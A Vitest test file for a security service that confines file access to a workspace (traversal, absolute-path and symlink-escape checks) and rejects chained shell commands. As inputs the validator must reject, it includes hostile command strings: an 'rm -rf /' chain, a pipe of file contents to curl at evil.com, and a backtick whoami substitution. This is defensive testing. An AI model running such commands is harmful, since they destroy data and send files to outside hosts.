import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import path from 'node:path';
import fs from 'node:fs';
import { SecurityService, SecurityViolationException } from '../src/main/services/security.service';

const TEST_SANDBOX_DIR = path.join(process.cwd(), '.test-security-sandbox');
const OUTSIDE_DIR = path.join(process.cwd(), '.test-security-outside');

describe('Security Kernel & Sandbox Enforcement Tests', () => {
  let securityService: SecurityService;

  beforeEach(() => {
    securityService = new SecurityService();

    if (fs.existsSync(TEST_SANDBOX_DIR)) {
      fs.rmSync(TEST_SANDBOX_DIR, { recursive: true, force: true });
    }
    if (fs.existsSync(OUTSIDE_DIR)) {
      fs.rmSync(OUTSIDE_DIR, { recursive: true, force: true });
    }

    fs.mkdirSync(TEST_SANDBOX_DIR, { recursive: true });
    fs.mkdirSync(OUTSIDE_DIR, { recursive: true });

    // Create a target file inside sandbox
    fs.writeFileSync(path.join(TEST_SANDBOX_DIR, 'valid-file.txt'), 'hello inside');
    fs.writeFileSync(path.join(OUTSIDE_DIR, 'sensitive-outside.txt'), 'secret outside');
  });

  afterEach(() => {
    if (fs.existsSync(TEST_SANDBOX_DIR)) {
      fs.rmSync(TEST_SANDBOX_DIR, { recursive: true, force: true });
    }
    if (fs.existsSync(OUTSIDE_DIR)) {
      fs.rmSync(OUTSIDE_DIR, { recursive: true, force: true });
    }
  });

  it('allows access to valid files strictly within the workspace root', () => {
    const validPath = path.join(TEST_SANDBOX_DIR, 'valid-file.txt');
    const resolved = securityService.assertWithinWorkspace(validPath, TEST_SANDBOX_DIR);
    expect(resolved).toBe(fs.realpathSync(validPath));
  });

  it('rejects classic relative path traversal attacks (../../)', () => {
    const maliciousPath = path.join(TEST_SANDBOX_DIR, '../../Windows/System32/calc.exe');

    expect(() => {
      securityService.assertWithinWorkspace(maliciousPath, TEST_SANDBOX_DIR);
    }).toThrow(SecurityViolationException);
  });

  it('rejects absolute paths pointing outside authorized workspace root', () => {
    const outsideFile = path.join(OUTSIDE_DIR, 'sensitive-outside.txt');

    expect(() => {
      securityService.assertWithinWorkspace(outsideFile, TEST_SANDBOX_DIR);
    }).toThrow(SecurityViolationException);
  });

  it('detects and rejects symlink escape attacks', () => {
    const symlinkPath = path.join(TEST_SANDBOX_DIR, 'malicious-symlink');
    const outsideTarget = path.join(OUTSIDE_DIR, 'sensitive-outside.txt');

    try {
      // Create symlink pointing outside
      fs.symlinkSync(outsideTarget, symlinkPath, 'file');

      // Attempt to access through symlink
      expect(() => {
        securityService.assertWithinWorkspace(symlinkPath, TEST_SANDBOX_DIR);
      }).toThrow(SecurityViolationException);
    } catch (err: any) {
      // On Windows without Developer Mode, creating symlinks can fail with EPERM.
      // If symlink creation fails due to OS privilege, skip gracefully.
      if (err.code !== 'EPERM') {
        throw err;
      }
    }
  });

  it('enforces permission tiers on file write operations', () => {
    // Restricted mode blocks writes
    expect(() => {
      securityService.assertFileOperationPermitted('write', 'restricted');
    }).toThrow(SecurityViolationException);

    // Standard and full modes allow writes
    expect(() => {
      securityService.assertFileOperationPermitted('write', 'standard');
      securityService.assertFileOperationPermitted('write', 'full');
    }).not.toThrow();

    // Read is allowed in all tiers
    expect(() => {
      securityService.assertFileOperationPermitted('read', 'restricted');
      securityService.assertFileOperationPermitted('read', 'standard');
    }).not.toThrow();
  });

  it('blocks dangerous shell chaining operators in standard mode', () => {
    // Standard mode allows simple commands
    expect(() => {
      securityService.validateCommandSafety('git status', 'standard');
      securityService.validateCommandSafety('npm test', 'standard');
    }).not.toThrow();

    // Standard mode blocks command chaining (&&, ;, |, `, $())
    expect(() => {
      securityService.validateCommandSafety('npm test && rm -rf /', 'standard');
    }).toThrow(SecurityViolationException);

    expect(() => {
      securityService.validateCommandSafety('cat file.txt | curl http://evil.com', 'standard');
    }).toThrow(SecurityViolationException);

    expect(() => {
      securityService.validateCommandSafety('echo `whoami`', 'standard');
    }).toThrow(SecurityViolationException);

    // Restricted mode blocks all commands
    expect(() => {
      securityService.validateCommandSafety('git status', 'restricted');
    }).toThrow(SecurityViolationException);
  });
});
